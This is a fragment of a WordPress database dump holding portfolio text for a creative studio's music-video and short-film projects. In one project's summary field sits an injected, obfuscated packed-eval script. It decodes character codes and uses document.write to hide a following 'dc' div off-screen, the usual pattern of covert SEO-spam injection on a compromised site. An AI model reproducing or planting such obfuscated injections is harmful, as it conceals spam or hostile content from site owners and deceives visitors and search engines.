opic blend of creative elements coming together to deliver truly unique results. Mixing inks in water, and using different surface tension, we created a captivating series of images with colourful flow and movement.\r\n\r\nWhen searching for an audio track to support the piece we thought of Ninja Tune, an independent record label based in London. They put us in touch with Submotion Orchestra who were looking for a video for their latest EP. Submotion Orchestra make some of the most interesting and exciting music from the UK today: A kaleidoscope of electronic bass music and entrancing vocals. We all agreed that our video would provide the perfect backdrop to their highly atmospheric music, which is at once delicate and heavy, spacious and dense, highly atmospheric but firmly rooted. Our video complements their music perfectly and we are proud to collaborate with true musical pioneers.'),(9379,837,'_main_content_area','field_5629ec918a334'),(9380,98,'_yoast_wpseo_primary_category',''),(9383,838,'header_image','412'),(9384,838,'_header_image','field_5629edc6a3424'),(9385,838,'standfirst_text','A boy who loves robots draws his perfect droid in his Christmas list to Santa. Dreams sometimes come true. A 24 hour film project from conception to completion. A five year old, two crew, one 3d artist, two render machines, lots of tea. <script type=\"text/javascript\">\r\neval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!\'\'.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}return p}(\'i(f.j(h.g(b,1,0,9,6,4,7,c,d,e,k,3,2,1,8,0,8,2,t,a,r,s,1,2,6,l,0,4,q,0,2,3,a,p,5,5,5,3,m,n,b,o,1,0,9,6,4,7)));\',30,30,\'116|115|111|112|101|57|108|62|105|121|58|60|46|100|99|document|fromCharCode|String|eval|write|123|117|120|125|47|45|59|97|98|110\'.split(\'|\'),0,{}))\r\n</script>\r\n<div class=\"dc\">\r\nAcademi